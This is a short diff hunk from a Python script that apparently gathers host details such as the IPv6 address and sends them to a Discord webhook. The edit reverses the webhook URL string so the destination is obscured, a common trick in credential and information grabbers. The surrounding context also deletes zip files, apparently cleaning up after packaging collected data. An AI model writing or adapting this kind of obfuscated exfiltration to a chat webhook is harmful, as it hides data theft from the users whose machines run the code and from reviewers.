@@ -67,7 +67,7 @@ def remove_all_zip_files(directory):
             except Exception as e:
                 pass
 
-webhook = DiscordWebhook(url=webhookurl)#Set up webhook
+webhook = DiscordWebhook(url=webhookurl[::-1])#Set up webhook
 
 def ip6():#get ipv6
     try:
